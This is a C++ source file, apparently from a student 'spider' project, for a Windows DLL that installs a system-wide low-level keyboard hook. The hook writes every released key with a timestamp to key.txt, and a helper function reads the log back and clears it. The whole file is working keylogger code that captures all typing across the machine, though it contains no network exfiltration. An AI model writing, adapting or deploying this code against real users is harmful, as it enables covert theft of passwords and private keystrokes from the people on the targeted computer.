//
// IziHook.cpp for IziHook in c:\Users\49207\Documents\Epitech-Rendu\cpp_spider\src\dll
//
// Made by Axel Drozdzynski
// Login   <drozdz_b>
//
// Started on  Sat Oct 6 19:25:58 2017 Axel Drozdzynski
// Last update Sat Oct 6 19:26:02 2017 Axel Drozdzynski
//


#include <fstream>
#include <ctime>
#include <iostream>
#include <fstream>
#include <sstream>
#include <atlstr.h>

#include "IziHook.hh"

#pragma comment(lib, "user32.lib")

bool quit = false;

#pragma data_seg(".shared")
HHOOK hook = 0;
HINSTANCE hDllInstance = 0;
#pragma data_seg()
#pragma comment(linker, "/SECTION:.shared,RWS")

//HHOOK hook{ NULL };

HANDLE tmpHandle = NULL;
HWND hWindow = 0;
std::ofstream file_out;
std::ifstream file_in;
std::list<std::string> lines;
bool toerase = false;
HANDLE mutex;
int installThread();

LRESULT CALLBACK kbproc(
	const int ncode, const WPARAM wparam, const LPARAM lparam
)
{
	KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lparam);
	DWORD result;

	result = WaitForSingleObject(mutex, INFINITE);

	if (result == WAIT_OBJECT_0)
	{
		if (toerase)
		{
			file_out.close();
			file_in.close();
			remove("key.txt");
			file_out.open("key.txt");
			file_in.open("key.txt");
			toerase = false;
		}

		if (wparam == WM_KEYDOWN)
		{

		}
		if (wparam == WM_KEYUP)
		{
			std::time_t t = std::time(nullptr);
			std::stringstream ss;
			std::string buffer2;
			char buffer[32] = {};
			UINT key = 0;
			key = (keyInfo.scanCode << 16);
			GetKeyNameText(key, (LPSTR)buffer, sizeof(buffer));
			file_out << (int)t << ":"
				<< buffer << ":"
				<< "2" << std::endl;
		}
		if (!ReleaseMutex(mutex))
		{
		}
	}
	return CallNextHookEx(hook, ncode, wparam, lparam);
}

int APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved) {
	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
			hDllInstance = hInstance;
			file_in.open("key.txt");
			file_out.open("key.txt");
			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&installThread, 0, 0, 0);
			toerase = false;
			//add_log("Attached.");
			mutex = CreateMutex(NULL, FALSE, NULL);
			break;
		case DLL_PROCESS_DETACH:
			std::cout << "Processe unattached" << std::endl;
			file_in.close();
			file_out.close();
			if (UnhookWindowsHookEx(hook) == 0)
				return (-1);
			return (0);
			//UninstallHook();
			break;
	}
	return TRUE;
}
int installThread()
{
	std::cout << "Processe attached" << std::endl;
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)kbproc, NULL, 0);
	if (hook == NULL)
		return (-1);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	return (0);
}

int getElements(std::list<std::string>& list)
{
	DWORD result;

	result = WaitForSingleObject(mutex, INFINITE);
	std::cout << "GO" << std::endl;
	if (result == WAIT_OBJECT_0)
	{
		std::string buffer;
		while (getline(file_in, buffer))
			list.push_back(buffer);
		toerase = true;
		if (!ReleaseMutex(mutex))
		{
		}
	}
	return (0);
}